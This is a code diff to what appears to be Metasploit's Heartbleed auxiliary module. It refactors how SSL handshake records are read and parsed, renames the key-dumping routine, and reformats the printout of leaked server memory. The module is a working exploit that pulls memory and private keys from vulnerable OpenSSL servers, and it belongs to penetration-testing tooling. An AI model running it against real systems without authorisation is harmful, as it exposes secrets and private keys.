@@ -71,6 +71,7 @@ class Metasploit3 < Msf::Auxiliary
     0x00ff  # Unknown
   ]
 
+  SSL_RECORD_HEADER_SIZE            = 0x05
   HANDSHAKE_RECORD_TYPE             = 0x16
   HEARTBEAT_RECORD_TYPE             = 0x18
   ALERT_RECORD_TYPE                 = 0x15
@@ -78,7 +79,6 @@ class Metasploit3 < Msf::Auxiliary
   HANDSHAKE_CERTIFICATE_TYPE        = 0x0b
   HANDSHAKE_KEY_EXCHANGE_TYPE       = 0x0c
   HANDSHAKE_SERVER_HELLO_DONE_TYPE  = 0x0e
-
 
   TLS_VERSION = {
     'SSLv3' => 0x0300,
@@ -98,6 +98,9 @@ class Metasploit3 < Msf::Auxiliary
 
   # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
   SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)
+
+  # For verbose output, deduplicate repeated characters beyond this threshold
+  DEDUP_REPEATED_CHARS_THRESHOLD = 400
 
   def initialize
     super(
@@ -203,18 +206,13 @@ class Metasploit3 < Msf::Auxiliary
 
   # Main method
   def run_host(ip)
-    # initial connect to get public key and stuff
-    connect_result = establish_connect
-    disconnect
-    return if connect_result.nil?
-
     case action.name
       when 'SCAN'
         loot_and_report(bleed)
       when 'DUMP'
         loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
       when 'KEYS'
-        getkeys
+        get_keys
       else
         # Shouldn't get here, since Action is Enum
         print_error("Unknown Action: #{action.name}")
@@ -424,20 +422,15 @@ class Metasploit3 < Msf::Auxiliary
 
     vprint_status("#{peer} - Sending Client Hello...")
     sock.put(client_hello)
-    server_hello = get_data
-    unless server_hello
-      vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
-      return nil
-    end
 
-    server_resp_parsed = parse_ssl_record(server_hello)
+    server_resp = get_server_hello
 
-    if server_resp_parsed.nil?
+    if server_resp.nil?
       vprint_error("#{peer} - Server Hello Not Found")
       return nil
     end
 
-    server_resp_parsed
+    server_resp
   end
 
   # Generates a heartbeat request
@@ -455,7 +448,7 @@ class Metasploit3 < Msf::Auxiliary
 
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat_request(heartbeat_length))
-    hdr = get_data(5)
+    hdr = get_data(SSL_RECORD_HEADER_SIZE)
     if hdr.nil? || hdr.empty?
       vprint_error("#{peer} - No Heartbeat response...")
       disconnect
@@ -533,16 +526,34 @@ class Metasploit3 < Msf::Auxiliary
       print_status("#{peer} - Heartbeat data stored in #{path}")
     end
 
-    vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+    # Convert non-printable characters to periods
+    printable_data = heartbeat_data.gsub(/[^[:print:]]/, '.')
+
+    # Keep this many duplicates as padding around the deduplication message
+    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round
+
+    # Remove duplicate characters
+    abbreviated_data = printable_data.gsub(/(.)\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|
+      s[0, duplicate_pad] +
+      ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +
+      s[-duplicate_pad, duplicate_pad]
+    end
+
+    # Show abbreviated data
+    vprint_status("#{peer} - Printable info leaked:\n#{abbreviated_data}")
 
   end
 
   #
-  # Keydumoing helper methods
+  # Keydumping helper methods
   #
 
   # Tries to retreive the private key
-  def getkeys
+  def get_keys
+    connect_result = establish_connect
+    disconnect
+    return if connect_result.nil?
+
     print_status("#{peer} - Scanning for private keys")
     count = 0
 
@@ -681,11 +692,32 @@ class Metasploit3 < Msf::Auxiliary
     ssl_record(HANDSHAKE_RECORD_TYPE, data)
   end
 
-  # Parse SSL header
-  def parse_ssl_record(data)
-    ssl_records = []
-    remaining_data = data
+  def get_ssl_record
+    hdr = get_data(SSL_RECORD_HEADER_SIZE)
+
+    unless hdr
+      vprint_error("#{peer} - No SSL record header received after #{response_timeout} seconds...")
+      return nil
+    end
+
+    len = hdr.unpack('Cnn')[2]
+    data = get_data(len)
+
+    unless data
+      vprint_error("#{peer} - No SSL record contents received after #{response_timeout} seconds...")
+      return nil
+    end
+
+    hdr << data
+  end
+
+  # Get and parse server hello response until we hit Server Hello Done or timeout
+  def get_server_hello
+    server_done = nil
     ssl_record_counter = 0
+
+    remaining_data = get_ssl_record
+
     while remaining_data && remaining_data.length > 0
       ssl_record_counter += 1
       ssl_unpacked = remaining_data.unpack('CH4n')
@@ -693,26 +725,28 @@ class Metasploit3 < Msf::Auxiliary
       ssl_type = ssl_unpacked[0]
       ssl_version = ssl_unpacked[1]
       ssl_len = ssl_unpacked[2]
-      vprint_debug("SSL record ##{ssl_record_counter}:")
-      vprint_debug("\tType:    #{ssl_type}")
-      vprint_debug("\tVersion: 0x#{ssl_version}")
-      vprint_debug("\tLength:  #{ssl_len}")
+      vprint_status("SSL record ##{ssl_record_counter}:")
+      vprint_status("\tType:    #{ssl_type}")
+      vprint_status("\tVersion: 0x#{ssl_version}")
+      vprint_status("\tLength:  #{ssl_len}")
       if ssl_type != HANDSHAKE_RECORD_TYPE
-        vprint_debug("\tWrong Record Type! (#{ssl_type})")
+        vprint_status("\tWrong Record Type! (#{ssl_type})")
       else
         ssl_data = remaining_data[5, ssl_len]
         handshakes = parse_handshakes(ssl_data)
-        ssl_records << {
-            :type => ssl_type,
-            :version => ssl_version,
-            :length => ssl_len,
-            :data => handshakes
-        }
+
+        # Stop once we receive a SERVER_HELLO_DONE
+        if handshakes && handshakes.length > 0 && handshakes[-1][:type] == HANDSHAKE_SERVER_HELLO_DONE_TYPE
+          server_done = true
+          break
+        end
+
       end
-      remaining_data = remaining_data[(ssl_len + 5)..-1]
+
+      remaining_data = get_ssl_record
     end
 
-    ssl_records
+    server_done
   end
 
   # Parse Handshake data returned from servers
@@ -729,24 +763,24 @@ class Metasploit3 < Msf::Auxiliary
       hs_len = hs_unpacked[2]
       hs_data = remaining_data[4, hs_len]
       handshake_count += 1
-      vprint_debug("\tHandshake ##{handshake_count}:")
-      vprint_debug("\t\tLength: #{hs_len}")
+      vprint_status("\tHandshake ##{handshake_count}:")
+      vprint_status("\t\tLength: #{hs_len}")
 
       handshake_parsed = nil
       case hs_type
         when HANDSHAKE_SERVER_HELLO_TYPE
-          vprint_debug("\t\tType:   Server Hello (#{hs_type})")
+          vprint_status("\t\tType:   Server Hello (#{hs_type})")
           handshake_parsed = parse_server_hello(hs_data)
         when HANDSHAKE_CERTIFICATE_TYPE
-          vprint_debug("\t\tType:   Certificate Data (#{hs_type})")
+          vprint_status("\t\tType:   Certificate Data (#{hs_type})")
           handshake_parsed = parse_certificate_data(hs_data)
         when HANDSHAKE_KEY_EXCHANGE_TYPE
-          vprint_debug("\t\tType:   Server Key Exchange (#{hs_type})")
+          vprint_status("\t\tType:   Server Key Exchange (#{hs_type})")
           # handshake_parsed = parse_server_key_exchange(hs_data)
         when HANDSHAKE_SERVER_HELLO_DONE_TYPE
-          vprint_debug("\t\tType:   Server Hello Done (#{hs_type})")
+          vprint_status("\t\tType:   Server Hello Done (#{hs_type})")
         else
-          vprint_debug("\t\tType:   Handshake type #{hs_type} not implemented")
+          vprint_status("\t\tType:   Handshake type #{hs_type} not implemented")
       end
 
       handshakes << {
@@ -763,13 +797,13 @@ class Metasploit3 < Msf::Auxiliary
   # Parse Server Hello message
   def parse_server_hello(data)
     version = data.unpack('H4')[0]
-    vprint_debug("\t\tServer Hello Version:           0x#{version}")
+    vprint_status("\t\tServer Hello Version:           0x#{version}")
     random = data[2,32].unpack('H*')[0]
-    vprint_debug("\t\tServer Hello random data:       #{random}")
+    vprint_status("\t\tServer Hello random data:       #{random}")
     session_id_length = data[34,1].unpack('C')[0]
-    vprint_debug("\t\tServer Hello Session ID length: #{session_id_length}")
+    vprint_status("\t\tServer Hello Session ID length: #{session_id_length}")
     session_id = data[35,session_id_length].unpack('H*')[0]
-    vprint_debug("\t\tServer Hello Session ID:        #{session_id}")
+    vprint_status("\t\tServer Hello Session ID:        #{session_id}")
     # TODO Read the rest of the server hello (respect message length)
 
     # TODO: return hash with data
@@ -782,8 +816,8 @@ class Metasploit3 < Msf::Auxiliary
     unpacked = data.unpack('Cn')
     cert_len_padding = unpacked[0]
     cert_len = unpacked[1]
-    vprint_debug("\t\tCertificates length: #{cert_len}")
-    vprint_debug("\t\tData length: #{data.length}")
+    vprint_status("\t\tCertificates length: #{cert_len}")
+    vprint_status("\t\tData length: #{data.length}")
     # contains multiple certs
     already_read = 3
     cert_counter = 0
@@ -793,14 +827,14 @@ class Metasploit3 < Msf::Auxiliary
       single_cert_unpacked = data[already_read, 3].unpack('Cn')
       single_cert_len_padding = single_cert_unpacked[0]
       single_cert_len =  single_cert_unpacked[1]
-      vprint_debug("\t\tCertificate ##{cert_counter}:")
-      vprint_debug("\t\t\tCertificate ##{cert_counter}: Length: #{single_cert_len}")
+      vprint_status("\t\tCertificate ##{cert_counter}:")
+      vprint_status("\t\t\tCertificate ##{cert_counter}: Length: #{single_cert_len}")
       certificate_data = data[(already_read + 3), single_cert_len]
       cert = OpenSSL::X509::Certificate.new(certificate_data)
       # First received certificate is the one from the server
       @cert = cert if @cert.nil?
-      #vprint_debug("Got certificate: #{cert.to_text}")
-      vprint_debug("\t\t\tCertificate ##{cert_counter}: #{cert.inspect}")
+      #vprint_status("Got certificate: #{cert.to_text}")
+      vprint_status("\t\t\tCertificate ##{cert_counter}: #{cert.inspect}")
       already_read = already_read + single_cert_len + 3
     end
 
